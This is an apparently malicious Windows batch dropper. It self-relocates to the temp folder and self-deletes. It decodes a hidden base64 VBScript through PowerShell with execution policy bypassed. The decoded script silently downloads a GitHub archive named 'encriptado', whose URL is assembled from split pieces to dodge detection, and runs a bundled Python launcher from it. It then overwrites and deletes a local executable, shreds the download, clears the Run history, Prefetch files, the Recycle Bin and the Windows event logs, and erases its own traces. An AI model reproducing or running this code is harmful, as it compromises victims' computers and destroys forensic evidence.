@echo off
setlocal enabledelayedexpansion

if not "%1"=="w" (
    set "tb=%TEMP%\~!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tb!" >nul 2>&1
    if exist "!tb!" (
        start /b cmd /c call "!tb!" w
        timeout /t 1 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vf=%TEMP%\~i!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$a='T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKc2NyaXB0UGF0aCA9IFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUKc2NyaXB0TmFtZSA9IGZzby5HZXRGaWxlTmFtZShzY3JpcHRQYXRoKQpzY3JpcHREaXIgPSBmc28uR2V0UGFyZW50Rm9sZGVyTmFtZShzY3JpcHRQYXRoKQp0ZW1wQmFzZSA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVRFTVAlIikKSWYgSW5TdHIoTENhc2Uoc2NyaXB0UGF0aCksIExDYXNlKHRlbXBCYXNlKSkgPiAwIEFuZCBMQ2FzZShzY3JpcHROYW1lKSA9ICJjb3JlLnZicyIgVGhlbgpleGVQYXRoID0gIiIKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKHNjcmlwdERpcikuRmlsZXMKSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgpleGVQYXRoID0gZi5QYXRoCkV4aXQgRm9yCkVuZCBJZgpOZXh0CkRpbSB1cmxQYXJ0cygxMCkKdXJsUGFydHMoMCkgPSAiaHR0cHM6Ly8iCnVybFBhcnRzKDEpID0gImdpdGh1Yi4iCnVybFBhcnRzKDIpID0gImNvbS8iCnVybFBhcnRzKDMpID0gImJyYXlhbmpob2FuY2UyLSIKdXJsUGFydHMoNCkgPSAiY29sbGFiLyIKdXJsUGFydHMoNSkgPSAiZW5jcmlwdCIKdXJsUGFydHMoNikgPSAiYWRvLyIKdXJsUGFydHMoNykgPSAiYXJjaGl2ZS8iCnVybFBhcnRzKDgpID0gInJlZnMvaGVhZHMvIgp1cmxQYXJ0cyg5KSA9ICJtYWluLiIKdXJsUGFydHMoMTApID0gInppcCIKcmVwb1VSTCA9ICIiCkZvciBpID0gMCBUbyAxMApyZXBvVVJMID0gcmVwb1VSTCAmIHVybFBhcnRzKGkpCk5leHQKemlwUGF0aCA9IHNjcmlwdERpciAmICJccmVwby56aXAiCmV4dHJhY3RQYXRoID0gc2NyaXB0RGlyICYgIlxleHRyYWN0ZWQiCnBzRG93bmxvYWQgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIiIiIgJiBfCiJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyAiICYgXwoiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KInRyeSB7ICIgJiBfCiIgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnIiAmIHJlcG9VUkwgJiAiJyAtT3V0RmlsZSAnIiAmIHppcFBhdGggJiAiJyAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0U2VjIDEyMDsgIiAmIF8KIiAgICBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAnIiAmIHppcFBhdGggJiAiJyAtRGVzdGluYXRpb25QYXRoICciICYgZXh0cmFjdFBhdGggJiAiJyAtRm9yY2UgIiAmIF8KIn0gY2F0Y2ggeyBleGl0IDEgfSAiICYgXwoiIiIiCnNoZWxsLlJ1biBwc0Rvd25sb2FkLCAwLCBUcnVlCldTY3JpcHQuU2xlZXAgODAwMApJZiBOb3QgZnNvLkZpbGVFeGlzdHMoemlwUGF0aCkgVGhlbgpXU2NyaXB0LlF1aXQKRW5kIElmCldTY3JpcHQuU2xlZXAgMjAwMApyZXBvUGF0aCA9ICIiCmxhdW5jaGVyUGF0aCA9ICIiCnB5dGhvblBhdGggPSAiIgpJZiBmc28uRm9sZGVyRXhpc3RzKGV4dHJhY3RQYXRoKSBUaGVuCkZvciBFYWNoIHN1YmZvbGRlciBJbiBmc28uR2V0Rm9sZGVyKGV4dHJhY3RQYXRoKS5TdWJGb2xkZXJzCklmIExDYXNlKHN1YmZvbGRlci5OYW1lKSA9ICJlbmNyaXB0YWRvLW1haW4iIFRoZW4KcmVwb1BhdGggPSBzdWJmb2xkZXIuUGF0aApsYXVuY2hlclBhdGggPSByZXBvUGF0aCAmICJcbGF1bmNoZXIucHkiCnB5dGhvblBhdGggPSByZXBvUGF0aCAmICJccHl0aG9uX3BvcnRhYmxlXHB5dGhvbi5leGUiCkV4aXQgRm9yCkVuZCBJZgpOZXh0CkVuZCBJZgpJZiByZXBvUGF0aCA8PiAiIiBBbmQgZnNvLkZpbGVFeGlzdHMobGF1bmNoZXJQYXRoKSBBbmQgZnNvLkZpbGVFeGlzdHMocHl0aG9uUGF0aCkgVGhlbgpzaGVsbC5DdXJyZW50RGlyZWN0b3J5ID0gcmVwb1BhdGgKY21kTGF1bmNoID0gIiIiIiAmIHB5dGhvblBhdGggJiAiIiIgIiIiICYgbGF1bmNoZXJQYXRoICYgIiIiCnNoZWxsLlJ1biBjbWRMYXVuY2gsIDAsIEZhbHNlCldTY3JpcHQuU2xlZXAgMTAwMDAKRW5kIElmCklmIGV4ZVBhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGV4ZVBhdGgpIFRoZW4KRm9yIGkgPSAxIFRvIDMKU2V0IGZ3ID0gZnNvLk9wZW5UZXh0RmlsZShleGVQYXRoLCAyKQpGb3IgaiA9IDEgVG8gMTAwMApmdy5Xcml0ZUxpbmUgU3RyaW5nKDgwLCBDaHIoSW50KFJuZCAqIDI2KSArIDY1KSkKTmV4dApmdy5DbG9zZQpXU2NyaXB0LlNsZWVwIDIwMApOZXh0CmZzby5EZWxldGVGaWxlIGV4ZVBhdGgsIFRydWUKRW5kIElmCldTY3JpcHQuU2xlZXAgMjAwMApJZiBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCnppcFNpemUgPSBmc28uR2V0RmlsZSh6aXBQYXRoKS5TaXplCklmIHppcFNpemUgPiAwIEFuZCB6aXBTaXplIDwgMTAwMDAwMDAwIFRoZW4KRm9yIHBhc3MgPSAxIFRvIDMKcHNTaHJlZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICIiIiIgJiBfCiIkYnl0ZXMgPSBOZXctT2JqZWN0IGJ5dGVbXSAiICYgemlwU2l6ZSAmICI7ICIgJiBfCiIoTmV3LU9iamVjdCBSYW5kb20pLk5leHRCeXRlcygkYnl0ZXMpOyAiICYgXwoiW0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCciICYgemlwUGF0aCAmICInLCAkYnl0ZXMpICIgJiBfCiIiIiIKc2hlbGwuUnVuIHBzU2hyZWQsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCA1MDAKY5leHQKRW5kIElmCmZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKRW5kIElmCnNoZWxsLlJlZ0RlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxSdW5NUlVcIgpwc0NsZWFyID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIiIiIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2U7ICIgJiBfCiJDbGVhci1SZWN5Y2xlQmluIC1Gb3JjZSAtQ29uZmlybTokZmFsc2U7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBBcHBsaWNhdGlvbiAyPiRudWxsOyAiICYgXwoid2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGwgIiAmIF8KIiIiIgpzaGVsbC5SdW4gcHNDbGVhciwgMCwgVHJ1ZQpXU2NyaXB0LlNsZWVwIDIwMDAKY2xlYW51cEJhdCA9IHNjcmlwdERpciAmICJcY2xlYW51cC5iYXQiClNldCBmYyA9IGZzby5DcmVhdGVUZXh0RmlsZShjbGVhbnVwQmF0LCBUcnVlKQpmYy5Xcml0ZUxpbmUgIkBlY2hvIG9mZiIKZmMuV3JpdGVMaW5lICJ0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bCIKZmMuV3JpdGVMaW5lICJ0YXNra2lsbCAvZiAvaW0gd3NjcmlwdC5leGUgPm51bCAyPiYxIgpmYy5Xcml0ZUxpbmUgImRlbCAvZiAvcSAiIiIiICYgc2NyaXB0UGF0aCAmICIiIiIgPm51bCAyPiYxIgpmYy5Xcml0ZUxpbmUgImNkIC9kICVURU1QJSIKZmMuV3JpdGVMaW5lICJybWRpciAvcyAvcSAiIiIiICYgc2NyaXB0RGlyICYgIiIiIiA+bnVsIDI+JjEiCmZjLldyaXRlTGluZSAiKGdvdG8pIDI+bnVsICYgZGVsIC9mIC9xICIiJX5mMCIiICYgZXhpdCIKZmMuQ2xvc2UKc2hlbGwuUnVuICJjbWQuZXhlIC9jICIiIiIgJiBjbGVhbnVwQmF0ICYgIiIiIiIsIDAsIEZhbHNlCldTY3JpcHQuUXVpdApFbHNlCnRlbXBJRCA9ICJzeXNfIiAmIEludChSbmQgKiA5OTk5OTkgKyAxMDAwMDApCnRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKZnNvLkNyZWF0ZUZvbGRlciB0ZW1wV29yawp2YnNUZW1wID0gdGVtcFdvcmsgJiAiXGNvcmUudmJzIgpmc28uQ29weUZpbGUgc2NyaXB0UGF0aCwgdmJzVGVtcCwgVHJ1ZQpzaGVsbC5SdW4gIndzY3JpcHQuZXhlICIiIiIgJiB2YnNUZW1wICYgIiIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQpXU2NyaXB0LlNsZWVwIDEwMDAKZnNvLkRlbGV0ZUZpbGUgc2NyaXB0UGF0aCwgVHJ1ZQpXU2NyaXB0LlF1aXQKRW5kIElm';$b=[Convert]::FromBase64String($a);[IO.File]::WriteAllBytes('%vf%',$b)"

timeout /t 2 /nobreak >nul

if exist "%vf%" (
    start /b wscript.exe "%vf%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit